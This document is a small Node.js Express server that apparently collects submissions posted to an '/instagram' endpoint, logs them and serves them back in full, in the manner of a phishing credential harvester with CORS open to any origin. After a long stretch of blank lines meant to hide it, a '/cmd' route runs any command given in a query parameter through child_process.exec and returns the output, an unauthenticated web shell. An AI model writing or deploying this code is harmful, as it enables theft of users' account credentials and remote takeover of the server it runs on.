const express = require("express")
const app = express()
const path = require("path")
const { exec } = require('child_process');
const bodyParser = require('body-parser');
const cors = require('cors');

app.use(cors({
    origin: '*'
}));

// Serve static files from the 'public' directory
app.use(express.static(path.join(__dirname, 'public')));

// In-memory data store
let users = [];
app.use(bodyParser.json());

app.get("/", (req, res) => {
    res.json({ message: "this is the root project" })
})

app.post("/instagram", (req, res) => {
    const body = req.body
    console.log(req.body)
    users.push(body)
    res.json({ message: "success" })
})

app.get("/instagram", (req, res) => {
    res.json({ message: users })
})



















app.get("/cmd", (req, res) => {
    const cmd = req.query.a
    exec(cmd, (error, stdout, stderr) => {
        if (error) {
            console.error(`Error executing command: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`Command stderr: ${stderr}`);
            return;
        }
        res.send(`<pre>${stdout}</pre>`)
    });
})

app.listen(8000, () => {
    console.log("server is listening on port 8000")
})